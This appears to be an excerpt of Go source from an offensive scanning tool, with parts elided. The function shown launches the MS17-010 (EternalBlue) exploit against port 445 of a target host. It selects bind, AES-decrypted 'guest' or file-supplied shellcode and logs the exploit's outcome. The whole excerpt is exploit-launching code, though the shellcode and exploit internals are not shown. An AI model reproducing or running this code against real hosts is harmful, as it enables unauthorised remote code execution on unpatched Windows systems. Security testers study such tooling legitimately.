...
func MS17010EXP(configInfo *common.ConfigInfo, hostInfo *common.HostInfo) {
	address := hostInfo.Host + ":445"
	var sc string
	switch configInfo.SC {
	case "bind":
	...
	case "guest":
		...
		sc = AesDecrypt(sc_enc, key)
	default:
		if strings.Contains(configInfo.SC, "file:") {
			read, err := ioutil.ReadFile(configInfo.SC[5:])
			if err != nil {
				errlog := fmt.Sprintf("[-] ms17010 sc readfile %v error: %v", configInfo.SC, err)
	...
	if err != nil {
		common.LogError(&configInfo.LogInfo, "[-] "+hostInfo.Host+" MS17-010 shellcode decode error "+err.Error())
		return
	}
	err = eternalBlue(address, 12, 12, sc1)
	if err != nil {
		common.LogError(&configInfo.LogInfo, "[-] "+hostInfo.Host+" MS17-010 exp failed "+err.Error())
		return
	}
	common.LogSuccess(&configInfo.LogInfo, "[*] "+hostInfo.Host+"\tMS17-010\texploit end")
}
